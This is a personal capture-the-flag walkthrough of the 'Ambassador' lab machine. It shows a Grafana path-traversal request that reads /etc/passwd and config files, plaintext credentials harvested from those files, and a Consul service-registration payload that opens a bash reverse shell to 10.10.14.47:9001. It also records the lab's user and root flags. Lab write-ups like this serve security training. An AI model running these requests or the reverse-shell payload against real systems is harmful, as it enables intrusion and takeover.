# Enumeration
IP :10.10.11.183
## Nmap
```bash
nmap -sC -sV -oA nmap/ambassador 10.10.11.183
**Nmap scan report for 10.10.11.183
Host is up (0.0085s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 29 Jan 2023 14:14:12 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 69
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, FoundRows, IgnoreSigpipes, SupportsTransactions, SupportsCompression, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, ODBCClient, LongPassword, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: {\x18m%\x1D!9H	;\x05\x18tJe\x17C-!@
|_  Auth Plugin Name: caching_sha2_password
**
```
Hugo version 0.94.2, Ubuntu

## Port 80
Static webpage.

## Port 3000
Grafana v8.2.0 which is older then sept 2021 (from github issue.)

Check exploit db to find a LFI
```python
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```
This is what the script boils down to.

Have to use burp cause `../` thingy

As mysql port is open going to try to sub in mysql for the choice.
```http
GET /public/plugins/mysql/../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.183:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2F
Upgrade-Insecure-Requests: 1
```
check `/etc/passwd` for users on the box
```
grep '/bin/bash' passwd
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
ssh key?

nope

Checking the grafana documentation for where the init file is stored.
```
/etc/grafana/grafana.ini
```
Look at file
```
cat grafana.ini | grep password
admin_password = messageInABottle685427
```
Admin:messageInABottle685427 logs into grafana

Nothing on grafana, try the db file. `/var/lib/grafana/grafana.db`

Get the creds out of the file by using sqlite3
```bash
mysql -u grafana -p -h 10.10.11.183
```


```
grafana:dontStandSoCloseToMe63221!
```
Try login to mysql, which works.

Get developers passwd (b64)
```
developer:anEnglishManInNewYork027468
```
user flag
```
d5d5e296b0066478c9f4667a26c04331
```
no sudo -l

# Priv esc
Found reference to consul which has a rce on metasploit.

Looking at the git logs for the wackywidget there is a consul token.
```
bb03b43b-1d81-d62b-24b5-39540ee469b5
```
Get the api data. (command and port found from metasploit script)
```
curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" localhost:8500/v1/agent/self; echo
```
Check if either `EnableLocalScriptChecks` or `EnableRemoteScriptChecks` is set to true.
```bash
cat dump.json | jq . | grep ScriptCheck
```
They both are!

Now to generate the payload as json data:
```json
{
"ID":"Notavirus",
"Name":"Notavirus",
"Address":"127.0.0.1",
"Port":80,
"check":{
	"args":[ "/bin/bash" , "-c", "bash -i >& /dev/tcp/10.10.14.47/9001 0>&1"],
	"interval":"10s",
	"Timeout":"86400s"
	}
}
```
Then trigger the exploit.
```bash
curl --request PUT --data @exp.json --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" localhost:8500/v1/agent/service/register; echo
```
root.txt
```
c36a52339bcd65f5f5d3bc24d8c7dd4d
```
:)

